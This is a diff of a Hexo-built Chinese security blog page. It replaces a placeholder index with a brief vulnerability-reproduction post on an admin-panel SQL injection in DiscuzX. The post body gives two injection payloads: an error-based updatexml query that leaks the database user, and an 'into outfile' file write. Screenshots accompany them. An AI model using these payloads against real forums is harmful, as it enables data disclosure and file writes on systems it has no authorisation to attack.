@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hexo</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Hexo">
+  <title>DiscuzX全版本后台sql注入 | Hexo</title>
+  <meta name="keywords" content=" 代码审计 , 漏洞复现 ">
+  <meta name="description" content="DiscuzX全版本后台sql注入 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="知弦 Security Researcher @ Chaitin , member of XDSEC &amp;amp; L-team. I is a dd.">
 <meta property="og:type" content="website">
@@ -50,7 +50,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -265,12 +265,72 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-DiscuzX全版本后台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#如何成为一名带黑客"><span class="toc-text">如何成为一名带黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一直学习就可以了"><span class="toc-text">一直学习就可以了</span></a></li></ol></li></ol>
+        <h1 class="article-title">DiscuzX全版本后台sql注入</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="代码审计">代码审计</a>/
+            
+                <a  data-rel="漏洞复现">漏洞复现</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color5">代码审计</a>
+            
+            <a class="color5">漏洞复现</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-01-07 17:54:31'>2020-01-07 17:43</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:26</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#写文件"><span class="toc-text">写文件</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -283,17 +343,42 @@
     }
 </style>
 </div>
-            <h1 id="如何成为一名带黑客"><a href="#如何成为一名带黑客" class="headerlink" title="如何成为一名带黑客"></a>如何成为一名带黑客</h1><h2 id="一直学习就可以了"><a href="#一直学习就可以了" class="headerlink" title="一直学习就可以了"></a>一直学习就可以了</h2>
-        </article>
-        
-        
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="angularjs">1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- -</code></pre>
+<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><pre><code class="angularjs">1&#39; into outfile &#39;1.txt&#39;; -- -</code></pre>
+<p><img src="../../../../img/dz1.png" alt=""></p>
+<p><img src="../../../../img/dz2.png" alt=""><br><img src="../../../../img/dz3.png" alt=""><br><img src="../../../../img/dz4.png" alt=""><br><img src="../../../../img/dz5.png" alt=""><br><img src="../../../../img/dz6.png" alt=""><br><img src="../../../../img/dz7.png" alt=""></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>DiscuzX全版本后台sql注入</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">26</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="知弦">知弦</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-01-07, 17:43:02</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-07, 17:54:31</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" title="DiscuzX全版本后台sql注入">http://zh1x1an.com/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
     <section id="comments" class="disqus">
     <style> aside.comment-bar { margin: auto 30px; }</style>
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://zh1x1an.com/';
-            this.page.identifier = 'categories/代码审计/index.html';
+            this.page.url = 'http://zh1x1an.com/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/';
+            this.page.identifier = '2020/01/07/DiscuzX全版本后台sql注入/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -335,8 +420,15 @@
 </section>
 
 <!-- Add comment count-->
-<span class="disqus-comment-count" style="display: none" data-disqus-identifier="categories/代码审计/index.html"></span>
-<span class="disqus-comment-count" style="display: none" data-disqus-url=""></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="2020/01/07/DiscuzX全版本后台sql注入/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://zh1x1an.com/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"></span>
+
+
+
+
+    
+
+
 
 
     </div>
